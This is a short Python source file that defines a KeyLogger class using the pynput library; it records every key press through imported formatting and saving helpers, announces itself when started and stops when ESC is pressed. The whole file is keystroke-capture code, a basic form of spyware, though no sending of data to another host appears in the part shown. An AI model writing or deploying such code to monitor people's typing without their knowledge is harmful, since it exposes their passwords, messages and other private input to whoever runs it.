from pynput import keyboard
from .utils import format_key, save_keystroke


class KeyLogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)

    def on_key_press(self, key):
        key_str = format_key(key)
        save_keystroke(key_str)
        if key == keyboard.Key.esc:
            return False

    def start(self):
        print("[*] Keylogger started. Press ESC to stop.")
        self.listener.start()
        self.listener.join()
